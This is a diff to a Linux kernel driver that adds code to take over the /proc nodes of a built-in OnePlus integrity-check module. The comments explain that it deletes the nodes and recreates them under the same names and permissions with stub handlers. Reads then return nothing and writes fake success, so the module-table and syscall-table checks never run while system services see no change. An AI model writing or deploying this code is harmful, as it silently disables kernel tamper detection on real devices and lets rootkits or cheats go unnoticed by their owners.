@@ -13,6 +13,7 @@
 #include <linux/ptrace.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
+#include <linux/proc_fs.h>
 
 #include "ace.h"
 #include "comm.h"
@@ -392,7 +393,77 @@ static struct kprobe ace_connect_kp = {
 	.pre_handler = ace_connect_pre,
 };
 
+
+/* ---- 一加 inte 节点接管 ----
+ * /sys/module/inte 是 built-in (不在 /proc/modules), 不能 rmmod,
+ * 三个 /proc 节点由它在初始化时创建。做法:
+ *   1) remove_proc_entry 摘掉原节点, 底层完整性检查的回调随之失联
+ *   2) 用相同 mode 的 proc_create 重建同名节点, 挂本驱动的 proc_ops
+ * 节点仍在(一加系统服务不会因为节点消失告警), 但读永远返回空、
+ * 写永远假装成功, inte 的模块表/systbl 检查永不真正执行。
+ * 需要"彻底消失"时把 arg 传 1, 只摘不重建。
+ */
+
+static ssize_t ace_inte_read(struct file *f, char __user *b, size_t n, loff_t *p)
+{
+	(void)f;
+	(void)b;
+	(void)n;
+	(void)p;
+	return 0;
+}
+
+static ssize_t ace_inte_write(struct file *f, const char __user *b, size_t n,
+			      loff_t *p)
+{
+	(void)f;
+	(void)b;
+	(void)p;
+	return (ssize_t)n;
+}
+
+static const struct proc_ops ace_inte_ops = {
+	.proc_read = ace_inte_read,
+	.proc_write = ace_inte_write,
+};
+
+static const struct {
+	const char *name;
+	umode_t mode;
+} ace_inte_tbl[] = {
+	{ "inte_ko",     0664 },
+	{ "inte_systbl", 0664 },
+	{ "inte_status", 0660 },
+};
+
+int ace_inte_takeover(int remove_only)
+{
+	int i, done = 0;
+
+	for (i = 0; i < (int)ARRAY_SIZE(ace_inte_tbl); ++i) {
+		struct proc_dir_entry *pde;
+
+		remove_proc_entry(ace_inte_tbl[i].name, NULL);
+		if (remove_only) {
+			++done;
+			continue;
+		}
+		pde = proc_create(ace_inte_tbl[i].name,
+				  ace_inte_tbl[i].mode, NULL, &ace_inte_ops);
+		if (!pde) {
+			pr_warn(ACE_PFX "rebuild %s failed\n",
+				ace_inte_tbl[i].name);
+			continue;
+		}
+		++done;
+	}
+	pr_info(ACE_PFX "inte takeover done=%d remove_only=%d\n",
+		done, remove_only);
+	return done;
+}
+
 /* ---- 对外接口 ---- */
+
 
 
 
